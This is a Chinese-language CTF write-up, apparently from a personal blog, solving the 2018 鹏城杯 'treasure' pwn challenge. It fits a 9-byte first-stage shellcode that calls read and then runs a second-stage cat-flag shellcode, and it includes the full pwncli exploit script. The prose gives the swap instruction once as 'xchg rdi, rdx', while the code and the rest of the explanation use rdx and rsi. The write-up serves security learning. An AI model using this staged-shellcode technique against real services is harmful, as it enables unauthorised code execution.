# 鹏城杯_2018_treasure



### 总结

根据本题，学习与收获有：

- 算是很简单的`shellcode`的题，需要手写`shellcode`
- 在写`shellcode`之前，可以先观察下寄存器状态，比如这题就可以很巧妙的去运用`read`的系统调用
- 使用`xchg`交换两个寄存器的值，是一个很方便的指令

<!-- more -->

### 题目分析

#### checksec

![image-20210815223050907](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815223050907.png)

题目使用的环境为`ubuntu-18.04`

#### 函数分析

##### settreasure

![image-20210815223131763](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815223131763.png)

流程为：

- 申请两个大小为`0x1000`的匿名映射段
- 往`sea`上拷贝了一段`shellcode`，但是拷贝的位置不可知，是随机的
- 把`data`段上的`shellcode`给清零了

##### treasure

![image-20210815223351747](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815223351747.png)

主要流程为：

- 将`code`段的权限改为`rwx`。这里虽然传入的是`0xa`，但是`mprotect`的改变权限的内存大小按照页对齐。

- 允许写入`9`个字节的`shellcode`
- 然后执行`shellcode`

### 利用思路

这里要写`shellcode`，但是只能写`9`个字节，所以写之前先打个断点看下寄存器的状态：

![image-20210815223721925](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815223721925.png)

观察一下：

- `rax`为`0`

- `rdi`为`0`
- `rdx`为`code+1`处
- `rsi`为`0x400c2a`



这个时候，交换一下`rsi`和`rdx`的值，然后再`syscall`，就是直接调用`read`，这个时候再写入比较长的`shellcode`然后再`call rsi`即可。那么只需要三条指令：`xchg rdi, rdx; syscall; call rsi`，肯定不会超过`9`字节啦。实测发现只有`7`个字节。

### exp

#### 调试过程

这里我选择填入`cat /flag`的`shellcode`。需要注意的是，需要跳过前`5`个字节，调试过程如下：

触发`read`：

![image-20210815224254818](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815224254818.png)



![image-20210815224339912](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815224339912.png)

写入`shellcode`读取`flag`：

![image-20210815224452008](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815224452008.png)



#### 完整exp

```python
from pwncli import *

cli_script()

p:tube = gift['io']

p.sendlineafter("will you continue?(enter 'n' to quit) :", "y")

payload = asm("xchg rdx, rsi;syscall;call rsi")

p.sendafter("start!!!!", payload)

p.sendline(b"a"*5 + asm(shellcraft.cat("./flag")))

p.interactive()
```

最后远程打：

![image-20210815224555329](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815224555329.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-15-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-treasure/  

